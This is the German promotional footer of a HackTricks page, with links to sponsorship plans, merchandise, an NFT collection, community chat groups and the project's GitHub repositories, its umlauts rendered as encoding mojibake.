* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
